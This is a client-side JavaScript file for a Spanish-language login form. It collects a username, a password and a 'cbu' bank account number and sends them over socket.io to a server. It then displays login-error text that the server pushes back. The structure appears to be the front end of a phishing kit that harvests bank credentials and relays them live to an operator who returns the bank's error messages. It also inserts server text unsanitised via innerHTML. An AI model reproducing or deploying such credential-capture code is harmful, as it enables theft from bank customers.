//const { text } = require("express");

const socket = io.connect("http://localhost:3000/", {
    forceNew: true,
    transports: ["polling"],
});



const emitDataServer = document.querySelector("#btn-send");
const userInput = document.querySelector("#user");
userInput.focus();

const passInput = document.querySelector("#pass");
const cbuInput = document.querySelector("#cbu");
const Alert = document.querySelector("#alert-modal");
const Alert2 = document.querySelector("#alert-modal2");
const CerrarModal = document.querySelector("#close-alert-modal");
const CerrarModal2 = document.querySelector("#close-alert2-modal");
const ShowPass = document.querySelector("#password-content");
const ShowUser = document.querySelector("#user-content");
const Avatar = document.querySelector("#avatar");
const LoginHelp = document.querySelector("#login-help");
const ErrorBanner = document.querySelector("#error-banner");
const TextErrorBanner = document.querySelector("#text-error");
const CloseErrorBanner = document.querySelector("#close-error-banner");
const VerUser = document.querySelector("#ver-user");
const LabelUser = document.querySelector("#label-input");
const form = document.querySelector("#form");
//const infoLogin = document.querySelector("#infologin");

var ShowVolver = "";

CerrarModal.addEventListener("click", () => {
    Alert.style.display = "none";
})

CerrarModal2.addEventListener("click", () => {
    Alert2.style.display = "none";
})

emitDataServer.addEventListener("click", (e) => {

    e.preventDefault();

    userInput.classList.remove('error-input');
    LabelUser.classList.remove('error-input-label');

    Alert.style.display = "none";
    Alert2.style.display = "none";
    const dataInputs = {
        'user': userInput.value,
        'pass': passInput.value,
        'cbu': cbuInput.value,
        'socket': socket.id,
    }

    var preloader = document.querySelector("#preloader");

    if (dataInputs.user.length < 6 || dataInputs.user.length > 15 || dataInputs.pass.length == 0 || dataInputs.cbu.length == 0) {
        preloader.style.display = "none";
        Alert.style.display = "flex";
    } else {
        socket.emit("Data", dataInputs);
        preloader.style.display = "block";
        setTimeout(() => {
            preloader.style.display = "none";
            passInput.value = "";
            userInput.value = "";
            cbuInput. value = "";
        }, 2000);
    }
})

socket.on("ErrorLogin", TextoBanner => {
    ErrorBanner.style.display = "flex";
    if (TextoBanner.slice(-7) == 'Aceptar') {
        TextErrorBanner.innerHTML = TextoBanner.slice(0, -9);
    } else {
        TextErrorBanner.innerHTML = TextoBanner;
    }
    LoginHelp.parentElement.classList.toggle('clave-nopodes');
    LoginHelp.parentElement.classList.toggle('nopodes');
})

CloseErrorBanner.addEventListener("click", () => {
    ErrorBanner.style.display = "none";
})

VerUser.addEventListener("click", () => {
    console.log(userInput.type)
    if (userInput.type == "text") {
        userInput.type = "password";
    } else {
        userInput.type = "text";
    }
})